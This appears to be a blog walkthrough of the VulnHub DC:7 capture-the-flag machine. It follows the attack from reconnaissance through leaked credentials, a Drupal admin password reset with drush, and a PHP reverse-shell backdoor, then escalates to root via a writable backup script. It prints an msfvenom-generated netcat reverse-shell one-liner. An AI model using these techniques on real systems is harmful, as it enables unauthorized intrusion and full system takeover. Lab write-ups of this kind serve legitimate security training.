<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Dc:7 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/dc7-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-09-05T17:40:57+00:00">September 5, 2019</time><time class="updated" datetime="2025-06-10T20:11:12+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">DC:7 writeup, our other CTF challenges for CTF players and it can be download from vulnhub from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/dc-7,356/">here</a></strong></span>. The credit goes to “DCAU” for designing this VM machine for beginners. This is a Linux based CTF challenge where you can use your basic pentest skill to compromise this VM to escalate the root privilege shell.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodologies</strong></span></h3>
<p><span style="color: #000000;"><strong>Network Scan</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Footprinting</strong></span></p>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;">SSH login</span></li>
<li><span style="color: #000000;">Abusing Drupal Drush</span></li>
<li><span style="color: #000000;">Compromising webshell via PHP Backdoor</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation </strong></span></p>
<ul>
<li><span style="color: #000000;">Abusing writable Script</span></li>
<li><span style="color: #000000;">Capture the Flag</span></li>
</ul>
<h3><span style="color: #800000;"><strong><u>Walkthrough</u></strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">Let’s start with a network scan using an aggressive Nmap scan as we always do, and this time also we will go with the same approach to identify open port for running services.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.101</pre>
<p><span style="color: #000000;">Hmmm! So nmap showed very exciting &amp; cool outcome, specifically on port 80 that is accessible to HTTP service and is also used to operate drupal CMS, additionally, 15 submissions for robot.txt is like a cheery on a cake.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4ihhyr9OPvI/XXFFnk7t1WI/AAAAAAAAgaA/qF2McsFK1fsbqWuYHeX-mJivu4Yg1LrIACLcBGAs/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Further, we need to start enumeration against the host machine, therefore without wasting time, we navigate to a web browser for exploring HTTP service, and DC:7- Welcome page will be opened in the browser that gave us a hint to search “outside the box” and this hint might be connected with internet.</span></p>
<p><span style="color: #000000;">At the end of this web page, we observed another hint “@DC7User” which could be any possible username.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RIpKFacZQpk/XXFFrcXQK_I/AAAAAAAAgaw/BdQSFX-E76kPoMd5UzOTGY_kCkxeX1q3gCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">By considering the above-listed hint, we start footprinting on the @DC7-user and find the DC7-user twitter account. This account contains a link to GitHub: <a style="color: #000000;" href="https://github.com/Dc7User">https:/github.com/Dc7User</a>, maybe the author was pointing to this link.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QVHhovprR48/XXFFrjqkQmI/AAAAAAAAga0/sQxaG9Yeg9AL4A8DvZU8ZpWm_RnR7EiyQCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">And the github URL content a staffdb which is PHP repositories.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cmJiIlKzRHU/XXFFrhmKpHI/AAAAAAAAga4/PeATI7ATd_M_pRwnfyMnWH1NOMdg5MdigCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">So when we have opened the staffdb, here config.php looks more interesting and a note i.e. as depicted below:</span></p>
<p><span style="color: #000000;"><em>“This is some “code” (yes, it’s not the greatest code, but that wasn’t the point) for the DC-7 challenge.</em></span></p>
<p><span style="color: #000000;"><em>This isn’t a flag, btw, but if you have made it here, well done anyway. :-)”</em></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-F609Od3ejiE/XXFFsHzSTcI/AAAAAAAAga8/4PIMhJNeuBEGktb3cAhv6MjYp0XdxkLqACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We found credential from inside config.php as shown below:</span></p>
<pre class="lang:default decode:true">Username: dc7user
Password: MdR3xOgB7#dW</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xz887lLEPHc/XXFFsgb5C2I/AAAAAAAAgbA/5N-lOLZhRt09QXFBEfHfGmjhQgnBMzAmwCLcBGAs/s1600/7.png"/></span></p>
<h3><span style="color: #800000;">Exploiting</span></h3>
<p><span style="color: #000000;">With the help of above-enumerated credential, we try to connect with ssh and after obtaining tty shell we go for post enumeration and start directory traversing.</span></p>
<pre class="lang:default decode:true">ssh dc7user@192.168.1.101</pre>
<p><span style="color: #000000;">At first, we’re looking for a directory list where we’ve found a “mbox” named file that contains an inbox message. The message contains /opt/script/backup.sh as the subject of the message, let’s explore more.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CQQrBgMmXVY/XXFFs2tGHyI/AAAAAAAAgbE/FVXPvtrrKM0mkUj2K5P-m4thUPN9lj2xQCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Inside <strong>backup.s</strong>h we notice it is using <strong>drush</strong> which stands for Drupal shell and it is a command-line utility that is used to communicate with drupal CMS.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7DOySQVHsgI/XXFFswPz6bI/AAAAAAAAgbI/x0juu2yzEKQdvbcZqLoKuuQJJgKhCgmOACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">So, I looked at the drush command on google and found a command that was used to change an account’s password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gubmqTbUUUU/XXFFnowTfKI/AAAAAAAAgaI/WLkmkdGdONI6OhYzH8-GG1in8vpOUfhTwCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Therefore, we try to change the admin password using the below command:</span></p>
<pre class="lang:default decode:true">drush user-password admin --password=raj</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tLa40AbLjZc/XXFFnllI-6I/AAAAAAAAgaE/eo89G3P5o4UsIdtK4j2uMVQIHxpmqs7UQCLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now, we’ve changed the password for the admin account to login to Drupal and explore the following URL:</span></p>
<pre class="lang:default decode:true">http://192.168.1.101/user/login</pre>
<p><span style="color: #000000;">After accessing the admin console, it was time to exploit web application by injecting malicious content inside it. Directly writing malicious scripts as web content will not give us the reverse shell of the application but after spending some time, we concluded that it requires PHP module. We, therefore, move to install new module through <strong><em>Manage&gt;Extend&gt;List&gt;Install new modul</em>e.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YamRa0d0xrY/XXFFoqYPxxI/AAAAAAAAgaM/VuzWi-g7ZacPBzuaE2mIpXP378pqIJ8AACLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">You can download the PHP package for Drupal from the URL below and upload the tar file to install the new module.</span></p>
<pre class="lang:default decode:true">https://www.drupal.org/project/php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oJAIROJXIho/XXFFo9PrT8I/AAAAAAAAgaQ/csJLqiSbxm0OtwY8Arcfgq23_8WRDsIwACLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">So, when the installation is completed, we need to enable to added module.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1_7xw1vmSxY/XXFFpHFmkEI/AAAAAAAAgaU/qG4nlLHvnlkU7n5LBola-0e_VKRevvhNwCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Again, move to <em>Manage &gt; Extend &gt;filters</em> and <em>enable the checkbox for PHP filters</em>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GutvpyuixyI/XXFFpY1IExI/AAAAAAAAgaY/V4K2u0Wr_i8ejYlsKLV2ycsBhSa8doaogCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now use the Pentest monkey PHP script, i.e. “reverse shell backdoor.php” to be injected as a basic content. Don’t forget to add a “listening IP &amp; port” to get a reversed connection. Continue to change the “text format to PHP” and enable the publishing checkbox. Keep the netcat listener ON in order to receive the incoming shell.</span></p>
<p><span style="color: #000000;">When everything is set correctly, click the preview button and you’ll get the reverse connection over the netcat.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DOR3h7QhBW4/XXFFqIgg6VI/AAAAAAAAgac/oai-O98QvSASTBB53ZmLBUPvFgc0shn6QCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Great!! we have our netcat session as www-data and if you will check permission on /opt/scripts/backup.sh, you will notice, that www-data has all permission to access or modify this file. We can therefore abuse the rights of the user file for escalating privileges by modifying the contents of the source.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ghKaTzswRYU/XXFFqJDomHI/AAAAAAAAgag/l5cM66nPkYsMYfq9j85nVKfEb_zvukSeQCLcBGAs/s1600/19.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">As said above we’ll try to abuse writable permission assign on the script. Thus, we use msfvenom to generate a malicious piece of code for obtaining the bash shell.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.106 lport=8888 R</pre>
<p><span style="color: #000000;">Now copy the generated code and start another netcat listener on a new terminal.</span></p>
<pre class="lang:default decode:true">mkfifo /tmp/ulgg; nc 192.168.1.106 8888 0&lt;/tmp/ulgg | /bin/sh &gt;/tmp/ulgg 2&gt;&amp;1; rm /tmp/ulgg</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_ssdrWPaeqQ/XXFFqSfCa7I/AAAAAAAAgak/cHFty3-cK_cPCd0CygObw3tYmeR2yLpHwCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Paste the code copied above in the previous netcat session under the www-data shell and wait for some time and get back to another netcat listener.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vBTXWdVLvO8/XXFFqlwqEeI/AAAAAAAAgao/Zmm1OF_QGP46hSttvpTWUHFsiFgnM6tfgCLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">After some time, you will have access to the root shell, you will now get the final flag in the root directory as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MdzlD0qaEgo/XXFFq13uzyI/AAAAAAAAgas/b7tazJR1ZcUb7fuxF6DYTrlB3M9COjUewCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
